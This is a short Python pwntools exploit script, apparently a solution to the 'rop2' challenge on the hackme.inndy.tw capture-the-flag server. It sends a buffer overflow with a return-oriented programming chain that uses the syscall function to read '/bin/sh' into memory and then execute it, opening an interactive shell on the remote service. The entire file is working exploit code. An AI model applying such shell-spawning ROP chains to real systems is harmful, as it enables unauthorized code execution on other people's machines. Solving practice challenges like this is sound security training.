#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "hackme.inndy.tw"
port = "7703"

if _local:
	r = process('./rop2')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

data = 0x0804a018
syscall_got_plt = 0x08048320
four_pop = 0x08048578

payload = 'A' * 16
payload += p32(syscall_got_plt) + p32(four_pop) + p32(0x03) + p32(0) + p32(data) + p32(8)
payload += p32(syscall_got_plt) + 'BBBB' + p32(0x0b) + p32(data) + p32(0) + p32(0)


print r. recvuntil(':')
r.sendline(payload)
r.sendline('/bin/sh\x00')
# print r.recv()
r.interactive()